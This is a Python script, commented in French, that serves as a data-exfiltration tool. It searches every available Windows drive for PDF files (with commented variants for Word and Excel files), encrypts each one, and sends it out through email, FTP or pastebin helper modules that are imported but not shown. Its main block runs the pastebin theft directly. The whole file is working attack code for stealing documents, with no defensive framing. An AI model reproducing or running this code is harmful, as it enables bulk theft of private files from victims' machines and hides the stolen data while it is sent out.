# exfiltrate.py
from cryptor import encrypt, decrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste
import os

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}

def find_docs(doc_type='.pdf'):
    """
    Génère les chemins de tous les fichiers d'un type spécifique sur le système
    """
    # Parcours de tous les lecteurs/disques disponibles
    drives = ['c:\\', 'd:\\', 'e:\\']  # Ajoutez d'autres lecteurs si nécessaire
    
    for drive in drives:
        if os.path.exists(drive):
            for parent, _, filenames in os.walk(drive):
                for filename in filenames:
                    if filename.endswith(doc_type):
                        document_path = os.path.join(parent, filename)
                        yield document_path

def exfiltrate(document_path, method):
    """
    Exfiltre un document en utilisant la méthode spécifiée
    """
    try:
        if method in ['transmit', 'plain_ftp']:
            # Méthodes nécessitant un fichier physique
            filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
            
            # Lecture et chiffrement du fichier original
            with open(document_path, 'rb') as f0:
                contents = f0.read()
            
            # Écriture du fichier chiffré temporaire
            with open(filename, 'wb') as f1:
                f1.write(encrypt(contents))
            
            # Exfiltration du fichier chiffré
            EXFIL[method](filename)
            
            # Nettoyage: suppression du fichier temporaire
            os.unlink(filename)
            print(f"Document exfiltré via {method}: {document_path}")
            
        else:
            # Méthodes utilisant du contenu (email, pastebin)
            with open(document_path, 'rb') as f:
                contents = f.read()
            
            title = os.path.basename(document_path)
            encrypted_contents = encrypt(contents)
            
            # Exfiltration du contenu chiffré
            EXFIL[method](title, encrypted_contents)
            print(f"Document exfiltré via {method}: {document_path}")
            
    except Exception as e:
        print(f"Erreur lors de l'exfiltration de {document_path} via {method}: {str(e)}")

if __name__ == '__main__':
    # Exfiltration de tous les fichiers PDF trouvés
    for fpath in find_docs('.pdf'):
        exfiltrate(fpath, 'plain_paste')
    
    # Exemples d'autres méthodes possibles:
    # for fpath in find_docs('.docx'):
    #     exfiltrate(fpath, 'outlook')
    # 
    # for fpath in find_docs('.xlsx'):
    #     exfiltrate(fpath, 'plain_ftp')